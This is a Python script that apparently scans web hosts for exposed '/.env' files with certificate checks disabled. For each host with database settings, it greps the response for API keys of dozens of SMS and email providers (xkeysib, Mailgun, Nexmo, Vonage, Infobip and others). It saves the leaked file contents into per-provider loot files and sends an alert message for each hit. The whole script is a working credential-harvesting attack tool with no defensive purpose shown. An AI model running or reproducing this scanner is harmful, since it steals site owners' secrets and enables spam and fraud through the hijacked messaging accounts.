from send_msg import send_msg2
import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings (InsecureRequestWarning)


def ENV(url):
    try:
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source2 = requests.post('https://'+url+'/.env', headers=headers, verify=False, allow_redirects=False)
       
        print('Testing ..  [ ' +url+' ] === [ ENV ]')
        all2=get_source2.text  
        if "DB_PORT=" in all2:
            open ('used/url-env.txt', 'a').write (url+ '\n')
            if "xkeysib" in all2:
                send_msg(url+'found xkeysib')
                open ('work/xkeysibdebug.txt', 'a').write (get_source2.content+ '\n')
            if "SMS" in all2:
                send_msg(url+'found SMS')
                open ('work/sms-env.txt', 'a').write (get_source2.content+ '\n')
            if "CLICKATELL" in all2:
                send_msg(url+'found CLICKATELL')
                open ('work/CLICKATELL-env.txt', 'a').write (get_source2.content+ '\n')
            if "smsfactor" in all2:
                send_msg(url+'found smsfactor')
                open ('work/smsfactor.txt', 'a').write (get_source2.content+ '\n')       
            if "MSG91" in all2:
                send_msg(url+'found MSG91')
                open ('work/MSG91-env.txt', 'a').write (get_source2.content+ '\n')
            if "PLIVO" in all2:
                send_msg(url+'found PLIVO')
                open ('work/PLIVO-env.txt', 'a').write (get_source2.content+ '\n')
            if "NETELIP" in all2:
                send_msg(url+'found NETELIP')
                open ('work/NETELIP-env.txt', 'a').write (get_source2.content+ '\n')
            if "NEXMO" in all2:
                send_msg(url+'found nexmo')
                open ('work/NEXMO-env.txt', 'a').write (get_source2.content+ '\n')
            if "VONAGE" in all2:
                send_msg(url+'found VONAGE')
                open ('work/VONAGE-env.txt', 'a').write (get_source2.content+ '\n')
            if "africastalking" in all2:
                send_msg(url+'africastalking')
                open ('work/africastalking-env.txt', 'a').write (get_source2.content+ '\n')
            if "skebby" in all2:
                send_msg(url+'skebby')
                open ('work/skebby-env.txt', 'a').write (get_source2.content+ '\n')
            if "hablame" in all2:
                send_msg(url+'hablame')
                open ('work/hablame-env.txt', 'a').write (get_source2.content+ '\n')
            if "lifetimesms" in all2:
                send_msg(url+'lifetimesms')
                open ('work/lifetimesms-env.txt', 'a').write (get_source2.content+ '\n')
            if "semaphore" in all2:
                send_msg(url+'semaphore')
                open ('work/semaphore-env.txt', 'a').write (get_source2.content+ '\n')
            if "mailjet" in all2:
                send_msg(url+'mailjet')
                open ('work/mailjet-env.txt', 'a').write (get_source2.content+ '\n')
            if "telesign" in all2:
                send_msg(url+'telesign')
                open ('work/telesign-env.txt', 'a').write (get_source2.content+ '\n')
            if "onnorokomsms" in all2:
                send_msg(url+'onnorokomsms')
                open ('work/onnorokomsms-env.txt', 'a').write (get_source2.content+ '\n')
            if "etracker" in all2:
                send_msg(url+'etracker')
                open ('work/etracker-env.txt', 'a').write (get_source2.content+ '\n')
            if "budgetsms" in all2:
                send_msg(url+'budgetsms')
                open ('work/budgetsms-env.txt', 'a').write (get_source2.content+ '\n')
            if "zenvia" in all2:
                send_msg(url+'zenvia')
                open ('work/zenvia-env.txt', 'a').write (get_source2.content+ '\n')
            if "smsaero" in all2:
                send_msg(url+'smsaero')
                open ('work/smsaero-env.txt', 'a').write (get_source2.content+ '\n')
            if "smsportal" in all2:
                send_msg(url+'smsportal')
                open ('work/smsportal-env.txt', 'a').write (get_source2.content+ '\n')
            if "boomsms" in all2:
                send_msg(url+'boomsms')
                open ('work/boomsms-env.txt', 'a').write (get_source2.content+ '\n')
            if "smsmasivos" in all2:
                send_msg(url+'smsmasivos')
                open ('work/smsmasivos-env.txt', 'a').write (get_source2.content+ '\n')
            if "wausms" in all2:
                send_msg(url+'wausms')
                open ('work/wausms-env.txt', 'a').write (get_source2.content+ '\n')
            if "advantasms" in all2:
                send_msg(url+'advantasms')
                open ('work/advantasms-env.txt', 'a').write (get_source2.content+ '\n')
            if "clicksend" in all2:
                send_msg(url+'clicksend')
                open ('work/clicksend-env.txt', 'a').write (get_source2.content+ '\n')
            if "sms.to" in all2:
                send_msg(url+'sms.to')
                open ('work/smsto-env.txt', 'a').write (get_source2.content+ '\n')
            if "moceanapi" in all2:
                send_msg(url+'moceanapi')
                open ('work/moceanapi-env.txt', 'a').write (get_source2.content+ '\n')
            if "smsviro" in all2:
                send_msg(url+'smsviro')
                open ('work/smsviro-env.txt', 'a').write (get_source2.content+ '\n')
            if "textlocal" in all2:
                send_msg(url+'textlocal')
                open ('work/textlocal-env.txt', 'a').write (get_source2.content+ '\n')          
            if "sinch" in all2:
                send_msg(url+'sinch')
                open ('work/sinch-env.txt', 'a').write (get_source2.content+ '\n')              
            if "infobip" in all2:
                send_msg(url+'infobip')
                open ('work/infobip.txt', 'a').write (get_source2.content+ '\n')
            if "mailgun" in all2:
                send_msg(url+'mailgun')
                open ('work/mailgun.txt', 'a').write (get_source2.content+ '\n')  
    except:
        pass

